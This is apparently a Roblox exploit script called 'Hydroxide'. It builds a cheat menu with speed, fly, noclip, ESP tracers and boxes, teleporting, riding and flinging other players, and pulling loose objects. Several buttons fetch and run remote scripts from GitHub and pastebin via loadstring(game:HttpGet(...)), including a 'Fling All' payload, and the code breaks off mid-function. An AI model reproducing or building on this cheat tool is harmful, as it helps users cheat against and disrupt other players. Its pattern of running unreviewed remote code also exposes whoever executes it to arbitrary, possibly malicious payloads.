local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- =========================
-- STARTUP / LOADING SCREEN
-- =========================

local startupGui = Instance.new("ScreenGui")
startupGui.Name = "HydroxideStartup"
startupGui.ResetOnSpawn = false
startupGui.Parent = PlayerGui

-- Background
local bg = Instance.new("Frame", startupGui)
bg.Size = UDim2.new(1,0,1,0)
bg.Position = UDim2.new(0,0,0,0)
bg.BackgroundColor3 = Color3.fromRGB(6,6,10)
bg.BorderSizePixel = 0

local bgCorner = Instance.new("UICorner", bg)
bgCorner.CornerRadius = UDim.new(0,0)

-- Neon Title
local neonFrame = Instance.new("Frame", bg)
neonFrame.Size = UDim2.new(0.4,0,0.2,0)
neonFrame.Position = UDim2.new(0.3,0,0.18,0)
neonFrame.BackgroundTransparency = 1

local neonTitle = Instance.new("TextLabel", neonFrame)
neonTitle.Size = UDim2.new(1,0,1,0)
neonTitle.BackgroundTransparency = 1
neonTitle.Text = "HYDROXIDE"
neonTitle.Font = Enum.Font.GothamBlack
neonTitle.TextSize = 48
neonTitle.TextScaled = true
neonTitle.TextColor3 = Color3.fromRGB(0,200,255)
neonTitle.TextTransparency = 1
neonTitle.TextStrokeTransparency = 0.7
neonTitle.AnchorPoint = Vector2.new(0.5,0.5)
neonTitle.Position = UDim2.new(0.5,0,0.5,0)

-- Spinner
local spinnerBack = Instance.new("Frame", bg)
spinnerBack.Size = UDim2.new(0,80,0,80)
spinnerBack.Position = UDim2.new(0.5,-40,0.45,-40)
spinnerBack.BackgroundTransparency = 1

local spinner = Instance.new("ImageLabel", spinnerBack)
spinner.Size = UDim2.new(1,0,1,0)
spinner.BackgroundTransparency = 1
spinner.Image = "rbxassetid://382334561"
spinner.Rotation = 0
spinner.ImageTransparency = 0.12

-- Progress Bar
local barBack = Instance.new("Frame", bg)
barBack.Size = UDim2.new(0.55,0,0,10)
barBack.Position = UDim2.new(0.225,0,0.68,0)
barBack.BackgroundColor3 = Color3.fromRGB(18,18,24)
barBack.BorderSizePixel = 0
local barCorner = Instance.new("UICorner", barBack); barCorner.CornerRadius = UDim.new(0,6)

local barFill = Instance.new("Frame", barBack)
barFill.Size = UDim2.new(0,0,1,0)
barFill.Position = UDim2.new(0,0,0,0)
barFill.BackgroundColor3 = Color3.fromRGB(0,200,255)
local fillCorner = Instance.new("UICorner", barFill); fillCorner.CornerRadius = UDim.new(0,6)

-- Terminal boot text container
local termFrame = Instance.new("Frame", bg)
termFrame.Size = UDim2.new(0.5,0,0.22,0)
termFrame.Position = UDim2.new(0.25,0,0.76,0)
termFrame.BackgroundTransparency = 1

local termLayout = Instance.new("UIListLayout", termFrame)
termLayout.Padding = UDim.new(0,4)
termLayout.FillDirection = Enum.FillDirection.Vertical
termLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left

local bootLines = {
    "[BOOT] Initializing Hydroxide Core...",
    "[ OK ] Loading UI Modules...",
    "[ OK ] Injecting User Scripts...",
    "[ OK ] Configuring Mobile Support...",
    "[ OK ] Establishing Visual Layer...",
    "[ OK ] Activating Tracers Module...",
    "[ OK ] Finalizing..."
}

local termLabels = {}

for i=1, #bootLines do
    local lbl = Instance.new("TextLabel", termFrame)
    lbl.Size = UDim2.new(1,0,0,18)
    lbl.BackgroundTransparency = 1
    lbl.Text = ""
    lbl.Font = Enum.Font.Code
    lbl.TextSize = 16
    lbl.TextColor3 = Color3.fromRGB(150,255,150)
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextTransparency = 0.9
    table.insert(termLabels, lbl)
end

-- small glitch overlay
local glitch = Instance.new("TextLabel", bg)
glitch.Size = UDim2.new(1,0,1,0)
glitch.Position = UDim2.new(0,0,0,0)
glitch.BackgroundTransparency = 1
glitch.Text = ""
glitch.Font = Enum.Font.GothamBold
glitch.TextSize = 48
glitch.TextColor3 = Color3.fromRGB(255,255,255)
glitch.TextTransparency = 1
glitch.ZIndex = 10

-- helper: typewriter for terminal lines
local function typeLine(label, text, speed)
    speed = speed or 0.01
    label.Text = ""
    label.TextTransparency = 0.2
    for i = 1, #text do
        label.Text = string.sub(text, 1, i)
        task.wait(speed)
    end
    label.Text = text
end

-- startup animation
local function runStartup()
    TweenService:Create(neonTitle, TweenInfo.new(0.9, Enum.EasingStyle.Quart), {TextTransparency = 0}):Play()
    for i = 1, 2 do
        TweenService:Create(neonTitle, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {TextColor3 = Color3.fromRGB(120,0,255)}):Play()
        task.wait(0.5)
        TweenService:Create(neonTitle, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {TextColor3 = Color3.fromRGB(0,200,255)}):Play()
        task.wait(0.5)
    end

    local spinConn
    spinConn = RunService.RenderStepped:Connect(function(dt)
        spinner.Rotation = spinner.Rotation + 160 * dt
    end)

    local total = #bootLines
    for i, line in ipairs(bootLines) do
        typeLine(termLabels[i], line, 0.01 + (i*0.002))

        if math.random() < 0.25 then
            glitch.Text = "HYDROXIDE"
            glitch.TextTransparency = 0.85
            glitch.Position = UDim2.new(0.5, math.random(-40,40), 0.2, math.random(-8,8))
            task.wait(0.06)
            glitch.TextTransparency = 1
            glitch.Position = UDim2.new(0,0,0,0)
        end

        local target = i / total
        TweenService:Create(barFill, TweenInfo.new(0.45), {Size = UDim2.new(target,0,1,0)}):Play()
        task.wait(0.35)
    end

    TweenService:Create(barFill, TweenInfo.new(0.25), {Size = UDim2.new(1,0,1,0)}):Play()
    task.wait(0.25)
    spinConn:Disconnect()

    for i = 1, 3 do
        glitch.TextTransparency = 0.8 - i*0.25
        task.wait(0.05)
        glitch.TextTransparency = 1
    end

    TweenService:Create(bg, TweenInfo.new(0.8), {BackgroundTransparency = 1}):Play()
    TweenService:Create(neonTitle, TweenInfo.new(0.8), {TextTransparency = 1}):Play()
    TweenService:Create(glitch, TweenInfo.new(0.8), {TextTransparency = 1}):Play()
    task.wait(0.85)
    -- ensure it's destroyed (defensive)
    if startupGui and startupGui.Parent then
        pcall(function() startupGui:Destroy() end)
    end
end

runStartup()

-- =========================
-- HYDROXIDE MAIN GUI
-- =========================

-- small defensive wait so any tweens finish before creating main UI
task.wait(0.06)

local mainGui = Instance.new("ScreenGui")
mainGui.Name = "Hydroxide"
mainGui.ResetOnSpawn = false
mainGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
mainGui.Parent = PlayerGui

-- =============================
-- ⚠️ FIX START — MAKE TEXT SHOW + ORDER FIX
-- =============================
-- Defensive: ensure any residual startup GUI is removed and clear tweened transparency
if startupGui and startupGui.Parent then
    pcall(function() startupGui:Destroy() end)
end

-- give Roblox a moment to settle tween state
task.wait(0.04)

-- Force text transparency to 0 for anything that will be created under mainGui.
-- This prevents the startup tween from inheriting into new UI objects.
for _, v in ipairs(mainGui:GetDescendants()) do
    if v:IsA("TextLabel") or v:IsA("TextButton") then
        pcall(function() v.TextTransparency = 0 end)
    end
    if v:IsA("ImageLabel") then
        pcall(function() v.ImageTransparency = math.max(0, v.ImageTransparency or 0) end)
    end
end
-- =============================
-- ⚠️ FIX END
-- =============================

-- container
local container = Instance.new("Frame", mainGui)
container.Name = "MainContainer"
container.Size = UDim2.new(0, 360, 0, 520)
container.Position = UDim2.new(0.5, -180, 0.5, -260)
container.AnchorPoint = Vector2.new(0.5,0.5)
container.BackgroundColor3 = Color3.fromRGB(12,12,18)
container.BorderSizePixel = 0
container.ZIndex = 50 -- raised to ensure it's above any leftover overlays
container.Visible = true -- ALWAYS VISIBLE

local containerCorner = Instance.new("UICorner", container)
containerCorner.CornerRadius = UDim.new(0,14)

local containerStroke = Instance.new("UIStroke", container)
containerStroke.Color = Color3.fromRGB(60, 20, 200)
containerStroke.Thickness = 2
containerStroke.Transparency = 0.45

-- top bar
local topbar = Instance.new("Frame", container)
topbar.Size = UDim2.new(1,0,0,62)
topbar.Position = UDim2.new(0,0,0,0)
topbar.BackgroundColor3 = Color3.fromRGB(16,16,22)
topbar.BorderSizePixel = 0
Instance.new("UICorner", topbar).CornerRadius = UDim.new(0,12)

local titleLabel = Instance.new("TextLabel", topbar)
titleLabel.Size = UDim2.new(1, -90, 1, 0)
titleLabel.Position = UDim2.new(0,18,0,0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Hydroxide"
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.TextSize = 24
titleLabel.TextColor3 = Color3.fromRGB(0,200,255)
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
-- ensure visible
titleLabel.TextTransparency = 0

-- close button
local closeBtn = Instance.new("TextButton", topbar)
closeBtn.Size = UDim2.new(0,44,0,44)
closeBtn.Position = UDim2.new(1, -54, 0, 9)
closeBtn.BackgroundColor3 = Color3.fromRGB(240,60,60)
closeBtn.Text = "X"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 22
closeBtn.TextColor3 = Color3.fromRGB(255,255,255)
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0,10)
closeBtn.MouseButton1Click:Connect(function()
    mainGui:Destroy()
end)
closeBtn.TextTransparency = 0

-- ============================================
-- FIXED DRAGGING (FULL CONTAINER DRAG, MOBILE)
-- ============================================

do
    local dragging = false
    local dragStart, startPos

    container.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = container.Position
        end
    end)

    container.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
            local delta = input.Position - dragStart
            container.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
end

-- left tabs
local tabCol = Instance.new("Frame", container)
tabCol.Size = UDim2.new(0,110,1,-84)
tabCol.Position = UDim2.new(0,12,0,70)
tabCol.BackgroundTransparency = 1

local tabLayout = Instance.new("UIListLayout", tabCol)
tabLayout.Padding = UDim.new(0,8)

-- content
local content = Instance.new("Frame", container)
content.Size = UDim2.new(1, -140, 1, -84)
content.Position = UDim2.new(0,128,0,70)
content.BackgroundTransparency = 1

-- tabs
local Tabs = {}
local function CreateTab(name)
    local btn = Instance.new("TextButton", tabCol)
    btn.Size = UDim2.new(1,0,0,48)
    btn.BackgroundColor3 = Color3.fromRGB(20,20,28)
    btn.Text = name
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 16
    btn.TextColor3 = Color3.fromRGB(230,230,230)
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)
    btn.TextTransparency = 0

    local page = Instance.new("ScrollingFrame", content)
    page.Size = UDim2.new(1,0,1,0)
    page.CanvasSize = UDim2.new(0,0,0,0)
    page.ScrollBarThickness = 6
    page.BackgroundTransparency = 1
    page.Visible = false
    page.ZIndex = 50

    local layout = Instance.new("UIListLayout", page)
    layout.Padding = UDim.new(0,10)
    layout.SortOrder = Enum.SortOrder.LayoutOrder

    btn.MouseButton1Click:Connect(function()
        for _, t in pairs(Tabs) do
            t.Page.Visible = false
            t.Button.BackgroundColor3 = Color3.fromRGB(20,20,28)
        end
        page.Visible = true
        btn.BackgroundColor3 = Color3.fromRGB(40,20,90)
    end)

    table.insert(Tabs, {Button = btn, Page = page, Layout = layout})
    return page
end

local mainPage = CreateTab("Main")
local playerPage = CreateTab("Player")
local funPage = CreateTab("Fun")

Tabs[1].Page.Visible = true
Tabs[1].Button.BackgroundColor3 = Color3.fromRGB(40,20,90)

-- utility button creator
local function AddButton(page, text, callback)
    local btn = Instance.new("TextButton", page)
    btn.Size = UDim2.new(1,-12,0,44)
    btn.Position = UDim2.new(0,6,0,0)
    btn.BackgroundColor3 = Color3.fromRGB(28,28,36)
    btn.Text = text
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 16
    btn.TextColor3 = Color3.fromRGB(235,235,235)
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)

    btn.Visible = true 
    btn.TextTransparency = 0

    btn.MouseButton1Click:Connect(function()
        pcall(callback)
    end)

    local layout = page:FindFirstChildOfClass("UIListLayout")
    if layout then
        -- update canvas when layout changes (same logic; keep unchanged)
        layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
            page.CanvasSize = UDim2.new(0,0,0, layout.AbsoluteContentSize.Y + 14)
        end)
        -- immediate set after adding, in case layout already has content
        task.wait()
        page.CanvasSize = UDim2.new(0,0,0, layout.AbsoluteContentSize.Y + 14)
    end
    return btn
end

-- feature buttons
AddButton(mainPage, "Infinite Yield", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end)
AddButton(mainPage, "Owl Hub", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))() end)
AddButton(playerPage, "Fly (Press E)", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Xero2409/Fly-Gui-V2/main/flyv2.lua"))() end)
AddButton(playerPage, "Speed 100", function() LocalPlayer.Character.Humanoid.WalkSpeed = 100 end)
AddButton(playerPage, "Speed 50", function() LocalPlayer.Character.Humanoid.WalkSpeed = 50 end)
AddButton(funPage, "Fling All", function() loadstring(game:HttpGet("https://pastebin.com/raw/5vG6GcfD"))() end)

-- Ensure pages' CanvasSize reflect their content (defensive)
for _, t in ipairs(Tabs) do
    local layout = t.Layout or t.Page:FindFirstChildOfClass("UIListLayout")
    if layout then
        task.spawn(function()
            task.wait() -- let layout calculate
            pcall(function()
                t.Page.CanvasSize = UDim2.new(0,0,0, layout.AbsoluteContentSize.Y + 14)
            end)
        end)
    end
end

-- =========================
-- TRACERS
-- =========================

local Camera = workspace.CurrentCamera
local TracersEnabled = false
local Tracers = {}

local function CreateTracer()
    local line = Drawing.new("Line")
    line.Color = Color3.fromRGB(255, 0, 120)
    line.Thickness = 2
    line.Transparency = 1
    line.Visible = true
    return line
end

local tracerToggleBtn = AddButton(playerPage, "Tracers: ON", function()
    TracersEnabled = not TracersEnabled
    tracerToggleBtn.Text = "Tracers: " .. (TracersEnabled and "ON" or "OFF")
    if not TracersEnabled then
        for _, t in pairs(Tracers) do
            if t and t.Visible ~= nil then
                t.Visible = false
            end
        end
    end
end)

RunService.RenderStepped:Connect(function()
    if not TracersEnabled then return end
    for _, pl in ipairs(Players:GetPlayers()) do
        if pl ~= LocalPlayer then
            local char = pl.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if not Tracers[pl] then
                Tracers[pl] = CreateTracer()
            end
            local tracer = Tracers[pl]
            if hrp and TracersEnabled then
                local pos, onScreen = Camera:WorldToViewportPoint(hrp.Position)
                if onScreen then
                    tracer.Visible = true
                    tracer.From = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y)
                    tracer.To = Vector2.new(pos.X, pos.Y)
                else
                    tracer.Visible = false
                end
            else
                tracer.Visible = false
            end
        end
    end
end)
-- =========================
-- INFINITE JUMP
-- =========================

local infiniteJumpEnabled = false

local infJumpBtn = AddButton(playerPage, "Infinite Jump: OFF", function()
    infiniteJumpEnabled = not infiniteJumpEnabled
    infJumpBtn.Text = "Infinite Jump: " .. (infiniteJumpEnabled and "ON" or "OFF")
end)

UserInputService.JumpRequest:Connect(function()
    if infiniteJumpEnabled then
        local char = LocalPlayer.Character
        if char then
            local hum = char:FindFirstChildWhichIsA("Humanoid")
            if hum then
                hum:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end
end)
-- =========================
-- FAST SPIN
-- =========================

local spinning = false
local spinSpeed = 10 -- bigger number = faster spin

local spinBtn -- declare first

spinBtn = AddButton(playerPage, "Fast Spin: OFF", function()
    spinning = not spinning
    spinBtn.Text = "Fast Spin: " .. (spinning and "ON" or "OFF")
end)

RunService.RenderStepped:Connect(function()
    if spinning then
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            local hrp = char.HumanoidRootPart
            hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
        end
    end
end)
-- =========================
-- NOCLIP
-- =========================

local noclipEnabled = false
local noclipBtn = AddButton(playerPage, "Noclip: OFF", function()
    noclipEnabled = not noclipEnabled
    noclipBtn.Text = "Noclip: " .. (noclipEnabled and "ON" or "OFF")
end)

RunService.Stepped:Connect(function()
    if noclipEnabled then
        local char = LocalPlayer.Character
        if char then
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end
end)
-- =========================
-- ORBIT PLAYER
-- =========================

local orbiting = false
local orbitDistance = 10     -- how far away from the target you orbit
local orbitSpeed = 4         -- how fast you spin

local orbitBtn = AddButton(playerPage, "Orbit Player: OFF", function()
    orbiting = not orbiting
    orbitBtn.Text = "Orbit Player: " .. (orbiting and "ON" or "OFF")
end)

local function getClosestPlayer()
    local closest = nil
    local shortest = math.huge

    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if myRoot then
                local dist = (plr.Character.HumanoidRootPart.Position - myRoot.Position).Magnitude
                if dist < shortest then
                    shortest = dist
                    closest = plr
                end
            end
        end
    end

    return closest
end

RunService.Heartbeat:Connect(function(dt)
    if orbiting then
        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root then return end

        local targetPlayer = getClosestPlayer()
        if not targetPlayer then return end

        local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not targetRoot then return end

        -- compute orbit position
        local t = tick() * orbitSpeed
        local offset = Vector3.new(math.cos(t) * orbitDistance, 3, math.sin(t) * orbitDistance)

        root.CFrame = CFrame.new(targetRoot.Position + offset, targetRoot.Position)
    end
end)
-- =========================
-- TELEPORT TO NEAREST PLAYER
-- =========================

AddButton(playerPage, "TP to Nearest", function()
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local hrp = char.HumanoidRootPart

    local closest, closestDist = nil, 999999

    for _, pl in ipairs(Players:GetPlayers()) do
        if pl ~= LocalPlayer and pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (pl.Character.HumanoidRootPart.Position - hrp.Position).Magnitude
            if dist < closestDist then
                closest = pl
                closestDist = dist
            end
        end
    end

    if closest then
        hrp.CFrame = closest.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
    end
end)
-- =========================
-- RIDE NEAREST PLAYER
-- =========================

AddButton(playerPage, "Ride Nearest", function()
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local hrp = char.HumanoidRootPart

    local closest, closestDist = nil, 999999

    for _, pl in ipairs(Players:GetPlayers()) do
        if pl ~= LocalPlayer and pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (pl.Character.HumanoidRootPart.Position - hrp.Position).Magnitude
            if dist < closestDist then
                closest = pl
                closestDist = dist
            end
        end
    end

    if closest then
        local targetHRP = closest.Character.HumanoidRootPart

        -- detach old welds
        for _, v in pairs(hrp:GetChildren()) do
            if v:IsA("Weld") or v:IsA("WeldConstraint") then
                v:Destroy()
            end
        end

        -- create weld
        local weld = Instance.new("WeldConstraint")
        weld.Part0 = hrp
        weld.Part1 = targetHRP
        weld.Parent = hrp

        -- place you above them (like riding)
        hrp.CFrame = targetHRP.CFrame * CFrame.new(0, 2, 0)

        print("Riding:", closest.Name)
    end
end)

AddButton(playerPage, "Stop Riding", function()
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end

    local hrp = char.HumanoidRootPart

    for _, v in ipairs(hrp:GetChildren()) do
        if v:IsA("Weld") or v:IsA("WeldConstraint") then
            v:Destroy()
        end
    end
end)

-- =========================
-- FAST HEAL
-- =========================

local fastHeal = false

local healBtn = AddButton(playerPage, "Fast Heal: OFF", function()
    fastHeal = not fastHeal
    healBtn.Text = "Fast Heal: " .. (fastHeal and "ON" or "OFF")
end)

RunService.Heartbeat:Connect(function()
    if fastHeal then
        local char = LocalPlayer.Character
        if char then
            local hum = char:FindFirstChildWhichIsA("Humanoid")
            if hum then
                hum.Health = hum.MaxHealth -- instantly fill health
            end
        end
    end
end)

-- =========================
-- SWIM EVERYWHERE
-- =========================

local swimEverywhere = false

local swimBtn = AddButton(playerPage, "Swim Everywhere: OFF", function()
    swimEverywhere = not swimEverywhere
    swimBtn.Text = "Swim Everywhere: " .. (swimEverywhere and "ON" or "OFF")
end)

RunService.Heartbeat:Connect(function()
    if swimEverywhere then
        local char = LocalPlayer.Character
        if char then
            local hum = char:FindFirstChildWhichIsA("Humanoid")
            if hum then
                -- force swim state
                hum:ChangeState(Enum.HumanoidStateType.Swimming)

                -- optional hover lift so you don't fall
                hum:Move(Vector3.new(0, 1, 0), true)
            end
        end
    end
end)

-- =========================
-- ORBIT PLAYER
-- =========================

-- =========================
-- ORBIT PLAYER
-- =========================

local orbitPlayer = false
local orbitDistance = 10     -- how far away you orbit
local orbitSpeed = 4         -- how fast you orbit

local orbitBtn = AddButton(playerPage, "Orbit Player: OFF", function()
    orbitPlayer = not orbitPlayer
    orbitBtn.Text = "Orbit Player: " .. (orbitPlayer and "ON" or "OFF")
end)

RunService.Heartbeat:Connect(function()
    if orbitPlayer then
        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root then return end

        -- get closest player (simple version — same style as your other toggles)
        local closest = nil
        local shortestDist = math.huge

        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local targetRoot = plr.Character.HumanoidRootPart
                local dist = (targetRoot.Position - root.Position).Magnitude
                if dist < shortestDist then
                    shortestDist = dist
                    closest = targetRoot
                end
            end
        end

        if closest then
            local t = tick() * orbitSpeed
            local offset = Vector3.new(
                math.cos(t) * orbitDistance,
                3,
                math.sin(t) * orbitDistance
            )

            root.CFrame = CFrame.new(closest.Position + offset, closest.Position)
        end
    end
end)

-- =========================
-- TP TAP (for your own game)
-- =========================

local tpTap = false

local tpTapBtn = AddButton(playerPage, "TP Tap: OFF", function()
    tpTap = not tpTap
    tpTapBtn.Text = "TP Tap: " .. (tpTap and "ON" or "OFF")
end)

-- Listen for screen taps/clicks
UserInputService.InputEnded:Connect(function(input)
    if not tpTap then return end
    if input.UserInputType ~= Enum.UserInputType.Touch
    and input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end

    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    -- raycast from screen -> world
    local mousePos = input.Position
    local camera = workspace.CurrentCamera

    local ray = camera:ScreenPointToRay(mousePos.X, mousePos.Y)
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {char}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist

    local result = workspace:Raycast(ray.Origin, ray.Direction * 5000, raycastParams)

    if result then
        root.CFrame = CFrame.new(result.Position + Vector3.new(0, 3, 0)) -- teleport slightly above ground
    end
end)

-- =========================
-- BOX ESP (for your own game)
-- =========================

local boxESP = false

local boxESPBtn = AddButton(playerPage, "Box ESP: OFF", function()
    boxESP = not boxESP
    boxESPBtn.Text = "Box ESP: " .. (boxESP and "ON" or "OFF")
end)

-- store drawing boxes
local espBoxes = {}

local function createESP(plr)
    if plr == LocalPlayer then return end
    if espBoxes[plr] then return end

    -- new BoxHandleAdornment around character
    local box = Instance.new("BoxHandleAdornment")
    box.Size = Vector3.new(4, 6, 4)
    box.Color3 = Color3.new(1, 1, 1)
    box.Transparency = 0.5
    box.ZIndex = 5
    box.AlwaysOnTop = true
    box.Visible = false
    box.Adornee = nil
    box.Parent = workspace

    espBoxes[plr] = box
end

local function removeESP(plr)
    if espBoxes[plr] then
        espBoxes[plr]:Destroy()
        espBoxes[plr] = nil
    end
end

-- create ESP for all players
Players.PlayerAdded:Connect(createESP)
Players.PlayerRemoving:Connect(removeESP)

for _, plr in ipairs(Players:GetPlayers()) do
    createESP(plr)
end

RunService.Heartbeat:Connect(function()
    for plr, box in pairs(espBoxes) do
        if not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") then
            box.Visible = false
        else
            box.Adornee = plr.Character
            box.Visible = boxESP
        end
    end
end)

-- =========================
-- OUTLINE ESP (for your own game)
-- =========================

local outlineESP = false

local outlineBtn = AddButton(playerPage, "Outline ESP: OFF", function()
    outlineESP = not outlineESP
    outlineBtn.Text = "Outline ESP: " .. (outlineESP and "ON" or "OFF")
end)

local outlineObjects = {}

local function addOutline(plr)
    if plr == LocalPlayer then return end
    if outlineObjects[plr] then return end

    local highlight = Instance.new("Highlight")
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.FillTransparency = 1          -- no fill, just outline
    highlight.OutlineTransparency = 0
    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
    highlight.Enabled = false
    highlight.Parent = workspace

    outlineObjects[plr] = highlight
end

local function removeOutline(plr)
    if outlineObjects[plr] then
        outlineObjects[plr]:Destroy()
        outlineObjects[plr] = nil
    end
end

Players.PlayerAdded:Connect(addOutline)
Players.PlayerRemoving:Connect(removeOutline)

for _, plr in ipairs(Players:GetPlayers()) do
    addOutline(plr)
end

RunService.Heartbeat:Connect(function()
    for plr, outline in pairs(outlineObjects) do
        if plr.Character then
            outline.Adornee = plr.Character
            outline.Enabled = outlineESP
        else
            outline.Enabled = false
        end
    end
end)

-- =========================
-- ORBIT LOOSE OBJECTS
-- =========================

local orbitObjects = false
local orbitRadius = 10
local orbitSpeed = 3

local orbitObjBtn = AddButton(playerPage, "Orbit Objects: OFF", function()
    orbitObjects = not orbitObjects
    orbitObjBtn.Text = "Orbit Objects: " .. (orbitObjects and "ON" or "OFF")
end)

RunService.Heartbeat:Connect(function()
    if not orbitObjects then return end

    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    local center = root.Position
    local t = tick() * orbitSpeed

    -- find loose objects
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and not obj.Anchored then
            -- ignore your own character
            if not obj:IsDescendantOf(char) then

                local dist = (obj.Position - center).Magnitude

                -- only orbit nearby stuff
                if dist < orbitRadius * 2 then
                    local angle = (obj:GetDebugId() * 10) + t -- unique offset per object

                    local orbitPos = Vector3.new(
                        center.X + math.cos(angle) * orbitRadius,
                        center.Y + 3,
                        center.Z + math.sin(angle) * orbitRadius
                    )

                    -- move using CFrame (smooth & strong)
                    obj.CFrame = CFrame.new(orbitPos)
                end
            end
        end
    end
end)

-- =========================
-- BRING LOOSE OBJECTS (FIXED)
-- =========================

task.wait(0.25) -- makes sure GUI + pages exist

local bringObjects = false
local bringStrength = 0.4

local bringBtn = AddButton(playerPage, "Bring Objects: OFF", function()
    bringObjects = not bringObjects
    bringBtn.Text = "Bring Objects: " .. (bringObjects and "ON" or "OFF")
end)

RunService.Heartbeat:Connect(function()
    if not bringObjects then return end

    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    local myPos = root.Position

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and not obj.Anchored then
            if not obj:IsDescendantOf(char) then
                local direction = (myPos - obj.Position)
                obj.AssemblyLinearVelocity = direction * bringStrength
            end
        end
    end
end)
-- =========================
-- LIGHT SPEED SPIN
-- =========================

local lightSpin = false
local spinSpeed = 10000 -- extremely fast spin, change if needed

local lightSpinBtn = AddButton(playerPage, "Light Speed Spin: OFF", function()
    lightSpin = not lightSpin
    lightSpinBtn.Text = "Light Speed Spin: " .. (lightSpin and "ON" or "OFF")
end)

RunService.Heartbeat:Connect(function(dt)
    if lightSpin then
        local char = LocalPlayer.Character
        if char then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(spinSpeed * dt), 0)
            end
        end
    end
end)

-- =========================
-- PUSH AURA (LOCAL)
-- =========================

local pushAura = false
local auraRadius = 10
local auraForce = 50

local pushAuraBtn = AddButton(playerPage, "Push Aura: OFF", function()
    pushAura = not pushAura
    pushAuraBtn.Text = "Push Aura: " .. (pushAura and "ON" or "OFF")
end)

-- visual aura effect
local auraParticles = nil

local function enableAuraEffect(hrp)
    auraParticles = Instance.new("ParticleEmitter")
    auraParticles.Rate = 15
    auraParticles.Lifetime = NumberRange.new(0.3, 0.5)
    auraParticles.Speed = NumberRange.new(0, 0)
    auraParticles.Size = NumberSequence.new(1.5)
    auraParticles.Color = ColorSequence.new(Color3.fromRGB(0, 150, 255))
    auraParticles.LightEmission = 1
    auraParticles.Parent = hrp
end

local function disableAuraEffect()
    if auraParticles then
        auraParticles:Destroy()
        auraParticles = nil
    end
end

RunService.Heartbeat:Connect(function()
    local char = LocalPlayer.Character
    if not char then return end

    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    -- turn on/off particles
    if pushAura then
        if not auraParticles then
            enableAuraEffect(hrp)
        end
    else
        disableAuraEffect()
        return
    end

    -- push loose parts around you (safe)
    for _, obj in ipairs(workspace:GetChildren()) do
        if obj:IsA("BasePart") and obj ~= hrp then
            local dist = (obj.Position - hrp.Position).Magnitude
